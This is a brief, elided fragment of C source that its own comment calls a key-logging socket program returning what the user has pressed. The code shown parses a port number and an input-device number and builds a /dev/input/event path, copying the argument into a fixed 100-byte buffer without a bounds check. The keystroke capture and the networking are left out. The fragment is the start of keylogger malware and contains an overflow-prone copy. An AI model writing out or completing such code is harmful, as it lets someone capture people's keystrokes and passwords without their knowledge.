/*
latest key logging c socket program that will receive request and send back what the user has pressed
*/
#include <stdio.h>
...
int main(int argc, char **argv) {
   ...
   char* inputeventnumber_ptr = argv[2];
   inputeventnumber = atoi(inputeventnumber_ptr);

   portnum = atoi(portstr);
   printf("using portnum=%d , device number = %d\n", portnum, inputeventnumber);
...
// H: Handlers=sysrq kbd event4 leds
   ...
   char devicefile[100] = "/dev/input/event";

   int i, base;
   base = strlen(devicefile);
   for(i=0;i<strlen(inputeventnumber_ptr);i++){
      devicefile[base+i]=inputeventnumber_ptr[i];
   }
   devicefile[base+i]='\0';
